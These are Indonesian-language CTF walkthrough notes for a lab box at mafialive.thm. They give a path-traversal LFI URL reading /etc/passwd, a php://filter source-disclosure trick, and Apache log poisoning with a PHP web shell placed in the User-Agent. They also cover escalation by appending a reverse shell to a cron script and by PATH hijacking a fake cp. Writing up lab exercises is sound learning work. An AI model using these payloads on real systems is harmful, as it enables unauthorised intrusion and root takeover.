# boot:
1. scan nmap 22 80 kebuka -> di 80 ada support kontak gini : mafialive.thm jadiin hosts aja
2. visit aja itu host nya nanti ada flag -> nah pas ada di host fuzz aja
3. di fuzz ada robots cek aja -> disitu ada button buttonnya bisa lfi keknya
4. lfi biasa gabisa keknya jadi lfi double slash trick 
5. http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc//passwd
6. lfi gatau mau apa bisa sih ke user.txt tapi buat dapet creds gada di bash history gada id rsa authorized_keys juga
7. next coba ini: php://filter/convert.base64-encode/resource=ke file yang mau di baca
8. nanti decode aja base64 nya -> nah coba arahin ke source web sekarang yang di /robots tadi
9. revshell clue nya poison: https://0xdf.gitlab.io/2018/09/08/htb-poison.html#web-shell-via-log-poisoning
10. nanti gini sambil  taruh payload php di user agent
11. http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var/log/apache2/access.log?c=whoami
12. oalah access log cek aja sih
13. salah bet ternyata gini
14. /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=ls 
15. nah itu user agent nya gini: User-Agent: 0xsidi: <?php system($_GET['cmd']); ?>
16. dari burp aja enak misal ada spasi ato apa tinggal urlencode -> gas reverse shell -> klaim user flag

# pe: 
1. www data ke user (horizontal PE) -> di linpeas ada cronjob jalan 1 menit sekali katanya di /opt
2. gas aja edit tambahin revshell -> echo "revshell" >> namafile.sh    
3. ke root: keknya ini vuln nya : cp /home/user/archangel/myfiles/* /opt/backupfiles -> strings di file backup di secret
4. strings backup -> dah coba aja dulu -> echo "/bin/bash" > cp -> chmod +x -> export PATH=/tmp:$PATH -> terus coba run backup
5. coba dulu aja -> echo $PATH coba -> run ini /home/archangel/secret/backup
6. ez kan PATH Hijacking -> dah klaim flag root
